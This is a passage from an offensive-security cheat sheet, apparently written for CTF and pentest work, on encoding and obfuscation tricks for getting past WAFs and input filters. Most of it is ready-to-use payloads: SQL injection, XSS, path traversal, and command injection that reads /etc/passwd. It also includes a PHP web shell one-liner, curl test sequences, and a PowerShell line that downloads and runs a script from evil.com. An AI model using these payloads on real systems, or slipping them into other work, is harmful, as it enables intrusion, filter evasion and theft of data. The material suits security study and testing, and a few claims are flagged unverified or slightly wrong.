        sys.exit(1)

if __name__ == '__main__':
    main()
```

---

**Related topics**: Binary exploitation, buffer overflow techniques, format string vulnerabilities, privilege escalation, post-exploitation frameworks, code review for security flaws

---

# Encoding & Obfuscation Bypass

Encoding and obfuscation techniques are critical for bypassing input validation, WAFs (Web Application Firewalls), and filters in CTF challenges and real-world web exploitation. Understanding these methods allows attackers to disguise malicious payloads while preserving their execution context.

---

## URL Encoding

URL encoding (percent-encoding) converts characters into a format transmittable over the Internet by replacing unsafe ASCII characters with a `%` followed by two hexadecimal digits.

### Character Encoding Reference

```
Space: %20
/ : %2f
\ : %5c
' : %27
" : %22
< : %3c
> : %3e
& : %26
= : %3d
; : %3b
: : %3a
? : %3f
```

### Common Bypass Scenarios

**Basic SQLi Filter Bypass:**

```bash
# Original payload
' OR 1=1--

# URL encoded
'%20OR%201=1--
%27%20OR%201%3D1--
```

**XSS Filter Bypass:**

```bash
# Original
<script>alert(1)</script>

# URL encoded
%3Cscript%3Ealert(1)%3C/script%3E
```

### Tools & Commands

**Python URL Encoding:**

```python
import urllib.parse

# Encode
payload = "' OR 1=1--"
encoded = urllib.parse.quote(payload)
print(encoded)  # '%27%20OR%201%3D1--

# Decode
decoded = urllib.parse.unquote(encoded)
```

**Bash/cURL:**

```bash
# Manual encoding in requests
curl "http://target.com/search?q=%27%20OR%201%3D1--"

# Using --data-urlencode
curl -G --data-urlencode "q=' OR 1=1--" http://target.com/search
```

**Burp Suite:**

- Select text → Right-click → Convert selection → URL → URL-encode key characters
- Decoder tab: Input text → Encode as → URL

**CyberChef Recipe:**

```
URL Encode (encode all special chars: true)
```

### Case Variations for Filter Evasion

```bash
# Uppercase hex digits (some filters only check lowercase)
%2F vs %2f
%3C vs %3c

# Mixed case in payloads
<ScRiPt> → %3CScRiPt%3E
```

---

## Double URL Encoding

Double URL encoding applies URL encoding twice, bypassing filters that decode input only once before validation but decode again before execution.

### Mechanism

```
Original: '
First encoding: %27
Second encoding: %2527
```

When a filter decodes once, it sees `%27` (appears safe). The application decodes again, executing `'`.

### Common Characters Double-Encoded

```
/ : %252f
\ : %255c
' : %2527
" : %2522
< : %253c
> : %253e
. : %252e
```

### Practical Examples

**Directory Traversal:**

```bash
# Single encoding (blocked)
../../etc/passwd
..%2f..%2f..%2fetc%2fpasswd

# Double encoding (bypasses filter)
..%252f..%252f..%252fetc%252fpasswd
```

**SQLi Bypass:**

```bash
# Filter blocks: %27
# But allows: %2527 (which decodes to %27, then ')

http://target.com/user?id=1%2527%20OR%201=1--
```

**Path Traversal in IIS:**

```bash
# IIS decodes URLs multiple times
http://target.com/page.asp?file=..%255c..%255c..%255cwindows%255csystem32%255cdrivers%255cetc%255chosts
```

### Tools & Commands

**Python Double Encoding:**

```python
import urllib.parse

payload = "' OR 1=1--"
first = urllib.parse.quote(payload)
double = urllib.parse.quote(first)
print(double)  # %2527%2520OR%25201%253D1--
```

**Bash Function:**

```bash
double_urlencode() {
    echo -n "$1" | jq -sRr @uri | jq -sRr @uri
}

double_urlencode "' OR 1=1--"
```

**Burp Suite:**

- Encode once → Encode the encoded output again
- Intruder: Use multiple processing rules (URL-encode → URL-encode)

### Detection & Exploitation Strategy

1. Test if application decodes multiple times
2. Submit `%2527` and check if single quote appears in errors
3. Gradually increase encoding depth (`%252527` = triple encoding)
4. Monitor responses for decoding behavior changes

---

## HTML Entity Encoding

HTML entity encoding represents special characters using named or numeric entities, bypassing filters that don't recognize encoded forms.

### Entity Types

**Named Entities:**

```
< : &lt;
> : &gt;
" : &quot;
' : &apos; or &#39;
& : &amp;
```

**Decimal Numeric Entities:**

```
< : &#60;
> : &#62;
" : &#34;
' : &#39;
/ : &#47;
```

**Hexadecimal Numeric Entities:**

```
< : &#x3c;
> : &#x3e;
" : &#x22;
' : &#x27;
/ : &#x2f;
```

### XSS Bypass Techniques

**Basic Entity Encoding:**

```html
<!-- Original -->
<script>alert(1)</script>

<!-- Named entities -->
&lt;script&gt;alert(1)&lt;/script&gt;

<!-- Decimal entities -->
&#60;script&#62;alert(1)&#60;/script&#62;

<!-- Hexadecimal entities -->
&#x3c;script&#x3e;alert(1)&#x3c;/script&#x3e;
```

**Attribute Context:**

```html
<!-- In href/src attributes, entities may decode -->
<img src=x onerror="alert(1)">
<img src=x onerror="&#97;&#108;&#101;&#114;&#116;(1)">
<img src=x onerror="&#x61;&#x6c;&#x65;&#x72;&#x74;(1)">
```

**Mixed Encoding:**

```html
<!-- Combine encoded and unencoded characters -->
<scr&#105;pt>alert(1)</scr&#105;pt>
<scr&#x69;pt>alert(1)</scr&#x69;pt>
&#60;scr&#105;pt&#62;alert(1)&#60;/scr&#105;pt&#62;
```

**JavaScript Context:**

```javascript
// In JavaScript strings, entities typically don't decode
// But in HTML event handlers, they may
<div onclick="&#97;&#108;&#101;&#114;&#116;(1)">Click</div>
```

### Tools & Commands

**Python HTML Encoding:**

```python
import html

# Encode
payload = "<script>alert(1)</script>"
encoded = html.escape(payload)
print(encoded)  # &lt;script&gt;alert(1)&lt;/script&gt;

# Custom decimal encoding
def decimal_encode(text):
    return ''.join(f'&#{ord(c)};' for c in text)

print(decimal_encode("<script>"))  # &#60;&#115;&#99;&#114;&#105;&#112;&#116;&#62;

# Custom hex encoding
def hex_encode(text):
    return ''.join(f'&#x{ord(c):x};' for c in text)

print(hex_encode("<script>"))  # &#x3c;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3e;
```

**CyberChef Recipe:**

```
To HTML Entity (encode all: true, numeric: true)
Or
To HTML Entity (encode all: true, numeric: false)  # Named entities
```

**Burp Suite:**

- Decoder tab: HTML encoding option
- Intruder: Add processing rule → Encode → HTML-encode

**JavaScript Console:**

```javascript
// Encode
function htmlEncode(str) {
    return str.replace(/[&<>"']/g, m => ({
        '&': '&amp;',
        '<': '&lt;',
        '>': '&gt;',
        '"': '&quot;',
        "'": '&#39;'
    }[m]));
}

// Decode
function htmlDecode(str) {
    const txt = document.createElement('textarea');
    txt.innerHTML = str;
    return txt.value;
}

htmlDecode("&#60;script&#62;");  // <script>
```

### Context-Specific Behavior

**Where Entities Decode:**

- HTML element content
- HTML attribute values (some contexts)
- Title tags
- Meta tag content

**Where Entities Don't Decode:**

- JavaScript code blocks
- JSON responses
- CSS contexts
- HTTP headers

---

## Base64 Encoding

Base64 encoding converts binary data into ASCII text using 64 printable characters (A-Z, a-z, 0-9, +, /), commonly used to bypass filters, transport data, or obfuscate payloads.

### Character Set

```
A-Z: 0-25
a-z: 26-51
0-9: 52-61
+: 62
/: 63
= : padding
```

### Common Use Cases

**Command Injection Bypass:**

```bash
# Original command
cat /etc/passwd

# Base64 encoded
Y2F0IC9ldGMvcGFzc3dk

# Execute via decoding
echo Y2F0IC9ldGMvcGFzc3dk | base64 -d | bash
```

**PowerShell Encoded Commands:**

```powershell
# Windows uses UTF-16LE for encoded commands
$payload = "IEX(New-Object Net.WebClient).DownloadString('http://evil.com/shell.ps1')"
$bytes = [System.Text.Encoding]::Unicode.GetBytes($payload)
$encoded = [Convert]::ToBase64String($bytes)

# Execute
powershell.exe -EncodedCommand $encoded
```

**SQL Injection Payload Obfuscation:**

```sql
-- Original
' UNION SELECT password FROM users--

-- Base64 encoded (passed to FROM_BASE64 or similar)
JyBVTklPTiBTRUxFQ1QgcGFzc3dvcmQgRlJPTSB1c2Vycw==
```

**File Upload Filter Bypass:**

```bash
# Encode malicious PHP in base64, upload as text
<?php system($_GET['cmd']); ?>
# Encoded: PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+

# Then decode on server if possible
```

### Tools & Commands

**Linux Base64:**

```bash
# Encode
echo -n "payload" | base64
echo -n "payload" | base64 -w 0  # No line wrapping

# Decode
echo "cGF5bG9hZA==" | base64 -d

# Encode file
base64 shell.php > shell.b64

# Decode file
base64 -d shell.b64 > shell.php
```

**Python Base64:**

```python
import base64

# Encode
payload = b"<?php system($_GET['cmd']); ?>"
encoded = base64.b64encode(payload).decode()
print(encoded)

# Decode
decoded = base64.b64decode(encoded)
print(decoded)

# URL-safe Base64 (uses - and _ instead of + and /)
urlsafe_encoded = base64.urlsafe_b64encode(payload).decode()
```

**PowerShell (Windows):**

```powershell
# Encode
$Text = "payload"
$Bytes = [System.Text.Encoding]::UTF8.GetBytes($Text)
$Encoded = [Convert]::ToBase64String($Bytes)

# Decode
$Decoded = [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($Encoded))

# UTF-16LE encoding (for -EncodedCommand)
$Bytes = [System.Text.Encoding]::Unicode.GetBytes($Text)
$Encoded = [Convert]::ToBase64String($Bytes)
```

**CyberChef:**

```
To Base64 (Alphabet: A-Za-z0-9+/=)
From Base64
```

**Burp Suite:**

- Decoder: Base64 encode/decode
- Intruder: Add processing rule → Encode → Base64-encode

### Advanced Techniques

**Partial Encoding:**

```bash
# Encode only suspicious parts
original: ' OR '1'='1
partial: ' OR 'MQ=='='MQ==' (only '1' encoded)
```

**Nested Encoding:**

```bash
# Base64 → URL encode
payload → base64 → URL encode the base64
```

**Base64 Variants:**

```bash
# Standard Base64
ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/

# URL-safe Base64 (RFC 4648)
ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-_
```

### MySQL Base64 Functions

```sql
-- Encode
SELECT TO_BASE64('payload');

-- Decode
SELECT FROM_BASE64('cGF5bG9hZA==');

-- Use in injection
' UNION SELECT FROM_BASE64('c2VjcmV0X2RhdGE=')--
```

### Recognition & Detection

```bash
# Base64 strings characteristics:
- Alphanumeric with +, /, =
- Length multiple of 4
- = padding at end (0-2 characters)
- Character distribution relatively even

# Decode and test:
echo "suspicious_string" | base64 -d
```

---

## Unicode Normalization

Unicode normalization standardizes different representations of the same character, exploitable when validation and execution use different normalization forms or when filters don't account for Unicode equivalents.

### Unicode Normalization Forms

**NFD (Canonical Decomposition):** Decomposes combined characters into base + combining marks

```
é (U+00E9) → e (U+0065) + ´ (U+0301)
```

**NFC (Canonical Composition):** Composes decomposed characters into combined forms

```
e (U+0065) + ´ (U+0301) → é (U+00E9)
```

**NFKD (Compatibility Decomposition):** Decomposes including compatibility equivalents

```
ﬁ (U+FB01) → f (U+0066) + i (U+0069)
```

**NFKC (Compatibility Composition):** Decomposes then composes compatibility equivalents

```
① (U+2460) → 1 (U+0031)
```

### Bypass Techniques

**Directory Traversal:**

```bash
# Unicode variations of '../'
../ (normal)
%C0%AE%C0%AE/ (overlong UTF-8)
..%c0%af (overlong slash)
..%ef%bc%8f (fullwidth solidus U+FF0F)

# Unicode dots
%E2%80%AE%E2%80%AE/ (U+202E - right-to-left override)
%u2024%u2024/ (U+2024 - one dot leader)
```

**Case Transformation Bypass:**

```bash
# Turkish I problem
# In Turkish locale: I → ı (dotless), i → İ (dotted)
# Can bypass case-insensitive filters

SELECT vs ＳＥＬＥＣＴ (fullwidth)
SELECT vs sℯℓℰ𝒞𝒯 (mathematical alphanumeric)
```

**Homograph Attacks:**

```bash
# Visually similar characters
admin vs аdmin (Cyrillic 'а' U+0430)
test.com vs tеst.com (Cyrillic 'е' U+0435)

# In URLs/domains
example.com vs еxample.com (Cyrillic е)
```

**Script Injection:**

```html
<!-- Fullwidth characters -->
<script> vs ＜script＞ (U+FF1C, U+FF1E)

<!-- Mathematical alphanumeric -->
alert vs 𝐚𝐥𝐞𝐫𝐭 (Mathematical bold)
```

**Null Byte & Control Characters:**

```bash
# Unicode null (different from ASCII null)
%00 (ASCII null) vs %C0%80 (overlong UTF-8 null)

# Zero-width characters (invisible)
U+200B (zero-width space)
U+200C (zero-width non-joiner)
U+200D (zero-width joiner)
U+FEFF (zero-width no-break space)

# Example: bypassing keyword filters
<scr%E2%80%8Bipt> (zero-width space between 'scr' and 'ipt')
```

### Tools & Commands

**Python Unicode Normalization:**

```python
import unicodedata

text = "é"  # Composed form
nfd = unicodedata.normalize('NFD', text)
nfc = unicodedata.normalize('NFC', text)
nfkd = unicodedata.normalize('NFKD', text)
nfkc = unicodedata.normalize('NFKC', text)

print(f"Original: {text!r}")
print(f"NFD: {nfd!r}")
print(f"NFC: {nfc!r}")

# Check if string contains combining characters
def has_combining(s):
    return any(unicodedata.category(c) == 'Mn' for c in s)

# Generate homoglyphs
def generate_homoglyphs(word):
    homoglyphs = {
        'a': ['а', 'ạ', 'ａ'],  # Cyrillic, Vietnamese, fullwidth
        'e': ['е', 'ē', 'ｅ'],
        'o': ['о', 'ο', 'ｏ'],  # Cyrillic, Greek, fullwidth
        # Add more as needed
    }
    # Generate variations...
```

**Identifying Unicode Characters:**

```python
def analyze_unicode(s):
    for char in s:
        print(f"Char: {char}")
        print(f"  Unicode: U+{ord(char):04X}")
        print(f"  Name: {unicodedata.name(char, 'UNKNOWN')}")
        print(f"  Category: {unicodedata.category(char)}")
```

**Bash/UTF-8 Encoding:**

```bash
# Encode specific Unicode code points
echo -e "\u00e9"  # é
echo -e "\u002e\u002e\u002f"  # ../

# Fullwidth solidus
echo -e "\uff0f"  # ／

# Check UTF-8 encoding of string
echo "suspicious" | hexdump -C
```

**CyberChef Recipes:**

```
To Unicode (format: U+XXXX)
From Unicode
Normalise Unicode (NFC/NFD/NFKC/NFKD)
```

**URL Encoding Unicode:**

```python
# Unicode to UTF-8 URL encoding
char = "＜"  # Fullwidth less-than U+FF1C
utf8_bytes = char.encode('utf-8')
url_encoded = ''.join(f'%{b:02X}' for b in utf8_bytes)
print(url_encoded)  # %EF%BC%9C
```

### Specific Attack Vectors

**Overlong UTF-8 Encoding:**

```bash
# Character '/' (U+002F) normally: %2F
# Overlong 2-byte: %C0%AF (invalid but some parsers accept)
# Overlong 3-byte: %E0%80%AF
# Overlong 4-byte: %F0%80%80%AF

# Example: directory traversal
http://target.com/files?path=..%C0%AF..%C0%AFetc%C0%AFpasswd
```

**Best-Fit Mapping (Windows):**

```bash
# Windows converts unmappable Unicode to similar ASCII
# Ｓ (U+FF33 fullwidth S) → S (U+0053)
# Can bypass filters checking ASCII only

ＳＥＬＥＣＴ → SELECT (after best-fit mapping)
```

**UTF-7 Encoding (Legacy IIS):**

```html
<!-- UTF-7 encoded XSS -->
+ADw-script+AD4-alert(1)+ADw-/script+AD4-

<!-- IIS with UTF-7 charset may interpret this -->
```

### Testing Methodology

1. **Identify Normalization Points:**
    
    - Input validation
    - Database storage
    - Display/output rendering
2. **Test Different Forms:**
    
    ```python
    payloads = [
        "admin",           # Normal
        "аdmin",          # Cyrillic 'а'
        "admin",          # With zero-width space
        "ａｄｍｉｎ",    # Fullwidth
    ]
    ```
    
3. **Check Filter Bypass:**
    
    - Submit normalized vs non-normalized
    - Test if filter and execution use different forms
    - Try combinations with other encoding
4. **Monitor Behavior:**
    
    - Error messages revealing encoding
    - Database query logs
    - Server-side normalization indicators

### Prevention Detection (For Understanding Defenses)

**Proper Validation:**

```python
# Normalize before validation
import unicodedata

def validate_input(user_input):
    # Normalize to NFC
    normalized = unicodedata.normalize('NFC', user_input)
    # Then validate normalized form
    if contains_malicious(normalized):
        return False
    return True
```

**Character Whitelist:**

```python
# Allow only specific Unicode ranges
def is_allowed(char):
    code = ord(char)
    # Basic Latin + Latin-1 Supplement
    return (0x0020 <= code <= 0x007E) or (0x00A0 <= code <= 0x00FF)
```

---

## Combined Encoding Techniques

Real-world bypasses often chain multiple encoding methods:

**Example 1: Double URL + Base64**

```bash
# Original SQLi payload
' UNION SELECT password FROM users--

# Base64 encode
JyBVTklPTiBTRUxFQ1QgcGFzc3dvcmQgRlJPTSB1c2Vycw==

# URL encode base64
JyBVTklPTiBTRUxFQ1QgcGFzc3dvcmQgRlJPTSB1c2Vycw%3D%3D

# Double URL encode
JyBVTklPTiBTRUxFQ1QgcGFzc3dvcmQgRlJPTSB1c2Vycw%253D%253D
```

**Example 2: Unicode + HTML Entities**

```html
<!-- Original XSS -->
<script>alert(1)</script>

<!-- Unicode fullwidth + HTML entities -->
&#xFF1C;script&#xFF1E;alert(1)&#xFF1C;/script&#xFF1E;
```

**Example 3: Mixed Encoding**

```bash
# Combine encoded and unencoded parts
<scr%69pt>alert(1)</scr%69pt>  # URL encode 'i'
<scr&#105;pt>alert(1)</scr&#105;pt>  # HTML entity 'i'
```

### Automation Script

```python
#!/usr/bin/env python3
import base64
import urllib.parse
import html

def multi_encode(payload, methods):
    """
    Encode payload using multiple methods
    methods: list like ['url', 'base64', 'html']
    """
    result = payload
    for method in methods:
        if method == 'url':
            result = urllib.parse.quote(result)
        elif method == 'double_url':
            result = urllib.parse.quote(urllib.parse.quote(result))
        elif method == 'base64':
            result = base64.b64encode(result.encode()).decode()
        elif method == 'html':
            result = html.escape(result)
        elif method == 'html_decimal':
            result = ''.join(f'&#{ord(c)};' for c in result)
    return result

# Test
payload = "' OR 1=1--"
print(multi_encode(payload, ['base64', 'url']))
print(multi_encode(payload, ['url', 'url']))  # Double URL
```

---

**Essential Encoding Tools for Kali:**

- **CyberChef** (web-based): `https://gchq.github.io/CyberChef/`
- **Burp Suite**: Decoder, Intruder encoding rules
- **Python**: urllib.parse, base64, html, unicodedata modules
- **Command line**: base64, iconv, recode
- **Browser Console**: btoa/atob, encodeURI/decodeURI

---

## Hex Encoding

Hex encoding converts characters to their hexadecimal representations, useful for bypassing filters that block specific strings or characters.

### URL Hex Encoding

Standard URL encoding using `%` prefix:

```bash
# Basic hex encoding
echo -n "admin" | xxd -p
# Output: 61646d696e

# URL-encoded format
# admin = %61%64%6d%69%6e
```

**Common applications:**

```bash
# SQL Injection bypass
# Original: ' OR 1=1--
# Encoded: %27%20OR%201%3d1--

# XSS bypass
# Original: <script>alert(1)</script>
# Encoded: %3Cscript%3Ealert(1)%3C%2Fscript%3E

# Command injection
# Original: ;cat /etc/passwd
# Encoded: %3Bcat%20%2Fetc%2Fpasswd
```

### JavaScript/HTML Hex Encoding

**HTML Entity Hex:**

```html
<!-- Decimal entities -->
<img src=x onerror="&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;">
<!-- alert(1) -->

<!-- Hex entities -->
<img src=x onerror="&#x61;&#x6c;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;">
<!-- alert(1) -->
```

**JavaScript Unicode escape:**

```javascript
// \xHH format (2-digit hex)
\x61\x6c\x65\x72\x74(1)  // alert(1)

// \uHHHH format (4-digit hex)
\u0061\u006c\u0065\u0072\u0074(1)  // alert(1)

// ES6 \u{} format
\u{61}\u{6c}\u{65}\u{72}\u{74}(1)  // alert(1)
```

### SQL Hex Encoding

MySQL and some databases interpret hex literals:

```sql
-- Original: SELECT * FROM users WHERE name='admin'
-- Hex encoded string:
SELECT * FROM users WHERE name=0x61646d696e

-- PostgreSQL requires explicit cast:
SELECT * FROM users WHERE name=E'\\x61646d696e'::bytea

-- Full query obfuscation:
SELECT 0x2a FROM users  -- SELECT * FROM users
```

**Practical CTF example:**

```bash
# Bypassing blacklist for "union select"
# Original: ' UNION SELECT 1,2,3--
# Hex: ' UNION SELECT 0x31,0x32,0x33--

# Using hex in WHERE clause to bypass "admin" filter
' OR username=0x61646d696e--
```

### Command Line Hex Encoding (bash)

```bash
# Using $'...' ANSI-C quoting
echo $'\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64'
# Executes: /etc/passwd

# In command injection context:
;cat$IFS$'\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64'
```

### Tools for Hex Encoding

```bash
# xxd - hex dump and reverse
echo "payload" | xxd -p  # Encode to hex
echo "7061796c6f6164" | xxd -r -p  # Decode from hex

# Python one-liner
python3 -c "print('payload'.encode('hex'))"  # Python 2
python3 -c "print('payload'.encode().hex())"  # Python 3

# CyberChef
# Use "To Hex" recipe with delimiter options
```

## Octal Encoding

Octal encoding uses base-8 representation, particularly effective in Unix/Linux contexts where octal is natively supported.

### Bash Octal Encoding

```bash
# $'...' syntax with octal
echo $'\141\144\155\151\156'  # "admin"

# Full path example
cat $'\057\145\164\143\057\160\141\163\163\167\144'
# Executes: cat /etc/passwd

# Command injection payload
;$'\143\141\164'$IFS$'\057\145\164\143\057\160\141\163\163\167\144'
# Executes: ;cat /etc/passwd
```

**Converting to octal:**

```bash
# Using printf
echo "admin" | while IFS= read -r -n1 char; do
    printf '\\%03o' "'$char"
done
# Output: \141\144\155\151\156

# Python conversion
python3 -c "print(''.join(f'\\{ord(c):03o}' for c in 'admin'))"
```

### SQL Octal Encoding (PostgreSQL)

PostgreSQL supports octal in escape strings:

```sql
-- E'' prefix for escape strings
SELECT E'\141\144\155\151\156';  -- Returns: admin

-- In WHERE clause
SELECT * FROM users WHERE username=E'\141\144\155\151\156';
```

**[Inference]** MySQL does not natively support octal in the same way, limiting this technique's applicability to specific database contexts.

### JavaScript/URL Octal

**[Unverified]** Some older JavaScript engines may interpret octal literals in non-strict mode:

```javascript
// Deprecated and unreliable
"\141\144\155\151\156"  // May not work in modern JS
```

**More reliable approach - octal character codes:**

```javascript
String.fromCharCode(0o141, 0o144, 0o155, 0o151, 0o156)  // "admin"
```

## Backslash Escaping

Backslash escaping manipulates how interpreters parse special characters, useful for evading filters and triggering alternate parsing behaviors.

### SQL Backslash Injection (GBK/Big5 Encoding)

Classic technique exploiting multibyte character sets:

```sql
-- Target query: SELECT * FROM users WHERE name='$input' AND pass='$pass'
-- Injection: %bf' OR 1=1--

-- What happens:
-- 1. Input: %bf' becomes \xbf\x27 (% decode)
-- 2. With addslashes(): \xbf\x5c\x27 (backslash added)
-- 3. GBK interprets \xbf\x5c as single character (縗)
-- 4. \x27 (') is now unescaped!

-- Result: SELECT * FROM users WHERE name='縗' OR 1=1--' AND pass=...
```

**Testing for vulnerability:**

```bash
# Send GBK-compatible byte + quote
curl -X POST "http://target/login.php" \
  --data "username=%bf%27+OR+1%3D1--&password=x"

# Alternative bytes that work:
# %bf, %c0, %c1, %e0-%ef (depends on charset)
```

### Command Injection Backslash Escaping

```bash
# Bypassing space filters
cat</etc/passwd  # No space needed
cat\</etc/passwd  # Backslash ignored

# Bypassing keyword filters
c\at /etc/passwd
ca\t /etc/passwd
/b\in/cat /etc/passwd

# Newline injection
cat /etc/passwd%0Als -la
# Executes two commands if newline not filtered
```

### Path Traversal Backslash Tricks

**Windows-specific:**

```bash
# Windows accepts both / and \
..\..\..\..\windows\system32\config\sam
../../windows/system32/config/sam  # Also works

# UNC path injection
\\server\share\file.txt
file://\\\server\share\file.txt
```

**Linux:**

```bash
# Backslash sometimes ignored or treated as escape
/etc/pass\wd  # May still access /etc/passwd on some systems

# Combining with URL encoding
..%5c..%5c..%5cetc%5cpasswd  # %5c = backslash
```

### XSS Backslash Escaping

Breaking out of JavaScript strings:

```javascript
// Original context: <script>var x = 'USER_INPUT';</script>
// Input: \'; alert(1);//

// Rendered: <script>var x = '\'; alert(1);//';</script>
// The backslash escapes itself, quote breaks string

// Alternative:
\x27; alert(1);//
// Backslash starts hex escape, x27 is quote
```

### PHP Magic Quotes Bypass (Legacy)

**[Unverified]** Relevant for very old PHP versions (< 5.4) or misconfigured systems:

```php
// If magic_quotes is on, addslashes() applied automatically
// Original: ' OR 1=1--
// Becomes: \' OR 1=1--

// Bypass using %00 null byte (ancient PHP only):
%00' OR 1=1--
// addslashes adds slash BEFORE null, string terminates at null

// GBK bypass (covered above) also defeats magic quotes
```

## Polymorphic Payloads

Polymorphic payloads maintain functionality while changing signature, defeating signature-based detection.

### XSS Polymorphism

**Character encoding variations:**

```html
<!-- Base payload -->
<script>alert(1)</script>

<!-- HTML entity encoding -->
<script>&#97;&#108;&#101;&#114;&#116;(1)</script>

<!-- Mixed encoding -->
<script>al\u0065rt(1)</script>

<!-- Case variation with Unicode -->
<sCrIpT>alert(1)</sCrIpT>

<!-- Using eval/Function -->
<script>eval(atob('YWxlcnQoMSk='))</script>  <!-- base64: alert(1) -->
<script>Function('alert(1)')()</script>

<!-- Template literals -->
<script>alert`1`</script>

<!-- Backtick execution (rare contexts) -->
<script>eval(`al`+`ert(1)`)</script>
```

**Tag/event polymorphism:**

```html
<!-- Image tag variations -->
<img src=x onerror=alert(1)>
<img/src=x/onerror=alert(1)>
<img src=x onerror="alert(1)">
<img src=x onerror='alert(1)'>
<img src=x onerror=`alert(1)`>

<!-- Alternative tags -->
<svg/onload=alert(1)>
<body onload=alert(1)>
<details open ontoggle=alert(1)>
<marquee onstart=alert(1)>

<!-- Using different JavaScript functions -->
<img src=x onerror=confirm(1)>
<img src=x onerror=prompt(1)>
<img src=x onerror=console.log(1)>
```

### SQL Injection Polymorphism

**Comment variations:**

```sql
-- MySQL comment styles
SELECT/**/1  -- Inline comment instead of space
SELECT/*comment*/1
SELECT/*!50000 1*/  -- Version-specific comment (executes if version >= 5.0)

-- Alternative comment markers
SELECT--+-1  -- Double dash with plus
SELECT#
1  -- Hash comment (newline continues query)

-- Nested comments (PostgreSQL)
SELECT/*/* */1  -- Inner comment breaks parser detection
```

**Whitespace polymorphism:**

```sql
-- Space alternatives
SELECT%091,2,3  -- Tab (\t = %09)
SELECT%0A1,2,3  -- Newline (\n = %0A)
SELECT%0D1,2,3  -- Carriage return (\r = %0D)
SELECT%A01,2,3  -- Non-breaking space (\xA0)

-- MySQL-specific
SELECT(1)  -- Parentheses act as separator
SELECT+1   -- Arithmetic operator as separator
```

**Keyword obfuscation:**

```sql
-- Case mixing
SeLeCt * FrOm users

-- Inline comments
SEL/**/ECT * FR/**/OM users

-- Double keywords (sometimes bypasses filters)
SELSELECTECT * FROFROMM users
-- If filter removes "SELECT", becomes: SELECT * FROM users

-- Unicode variations
SELECT * FROM users  -- Normal
ＳＥＬＥＣＴ * FROM users  -- Fullwidth characters (may not work)

-- Hex encoding
SELECT 0x61646d696e  -- Instead of 'admin'
```

**UNION alternatives:**

```sql
-- Standard UNION
' UNION SELECT 1,2,3--

-- Comment injection
' UNI/**/ON SEL/**/ECT 1,2,3--

-- Case mixing
' UnIoN SeLeCt 1,2,3--

-- Using hex
' UNION SELECT 0x31,0x32,0x33--

-- Newline injection
' UNION%0ASELECT%0A1,2,3--
```

### Command Injection Polymorphism

**Variable expansion tricks:**

```bash
# Empty variable insertion
cat$IFS/etc/passwd
cat${IFS}/etc/passwd
cat$u/etc/passwd  # $u is empty/undefined

# Brace expansion
{cat,/etc/passwd}  # Executes: cat /etc/passwd
{echo,test}        # Executes: echo test

# Wildcard obfuscation
/bin/c?t /etc/passwd   # ? matches 'a'
/bin/c*t /etc/passwd   # * matches 'a'
/???/c?t /etc/passwd   # Multiple wildcards
```

**Command substitution variations:**

```bash
# Backticks
`cat /etc/passwd`

# $() syntax
$(cat /etc/passwd)

# Nested
$($(echo cat) /etc/passwd)

# With encoding
$('\x63\x61\x74' /etc/passwd)  # Octal/hex encoded
```

**Quote manipulation:**

```bash
# Single quotes break keywords
c'a't /etc/passwd
c'a'c /etc/passwd  # cat with quotes

# Double quotes (allows variable expansion)
"c"a"t" /etc/passwd

# Mixed quotes
c'a"t /etc/passwd

# Escaped quotes
c\at /etc/passwd
```

**Separator polymorphism:**

```bash
# Semicolon
; cat /etc/passwd

# Newline
%0acat /etc/passwd

# Pipe
| cat /etc/passwd

# AND operator
&& cat /etc/passwd

# OR operator
|| cat /etc/passwd

# Background execution
& cat /etc/passwd &
```

### WAF Bypass Combination Techniques

**Multi-layer encoding:**

```bash
# Double URL encoding
%253Cscript%253E  # %25 = %, becomes %3Cscript%3E, then <script>

# URL + Hex
%3C%73%63%72%69%70%74%3E  # <script>

# Base64 in data URI (XSS)
<iframe src="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">
```

**Case + encoding + comments:**

```sql
' UnI/**/oN SeLe/**/cT 0x31,0x32,username FrOm users--
```

**Time-based polymorphism for SQLi:**

```sql
-- Standard
' AND SLEEP(5)--

-- Polymorphic variations
' AND IF(1=1,SLEEP(5),0)--
' AND (SELECT SLEEP(5))--
' AND BENCHMARK(10000000,MD5('A'))--  # MySQL CPU-intensive
' AND pg_sleep(5)--  # PostgreSQL
' AND WAITFOR DELAY '00:00:05'--  # MSSQL
```

### Tools for Polymorphic Payload Generation

```bash
# SQLMap tamper scripts
sqlmap -u "http://target/?id=1" --tamper=space2comment
sqlmap --tamper=between,randomcase,space2comment

# Available tampers:
# - apostrophemask: Replaces ' with UTF-8
# - between: Replaces > with NOT BETWEEN 0 AND #
# - charencode: URL-encodes all characters
# - charunicodeencode: Unicode-encodes non-encoded characters
# - space2comment: Replaces space with /**/
# - randomcase: Randomizes keyword case

# XSStrike (XSS polymorphism)
xsstrike -u "http://target/?q=test"

# Custom Python script for polymorphic generation
python3 << 'EOF'
import random

payload = "alert(1)"
methods = [
    lambda x: "".join(f"\\x{ord(c):02x}" for c in x),  # Hex
    lambda x: "".join(f"&#x{ord(c):x};" for c in x),    # HTML hex
    lambda x: "eval(atob('{}'))".format(__import__('base64').b64encode(x.encode()).decode()),  # Base64
    lambda x: "".join(random.choice([c.upper(), c.lower()]) for c in x)  # Random case
]

for method in methods:
    print(method(payload))
EOF
```

### Automated Testing Workflow

```bash
# 1. Test base payload
curl -X GET "http://target/?search=<script>alert(1)</script>"

# 2. If blocked, try URL encoding
curl -X GET "http://target/?search=%3Cscript%3Ealert(1)%3C%2Fscript%3E"

# 3. Try double encoding
curl -X GET "http://target/?search=%253Cscript%253Ealert(1)%253C%252Fscript%253E"

# 4. Mix case + encoding
curl -X GET "http://target/?search=%3CsCrIpT%3Ealert(1)%3C%2FsCrIpT%3E"

# 5. Alternative event handler
curl -X GET "http://target/?search=%3Cimg%20src=x%20onerror=alert(1)%3E"

# 6. Use burpsuite intruder with payload list
# Create wordlist with polymorphic variations
```

## Key Takeaways for CTF Scenarios

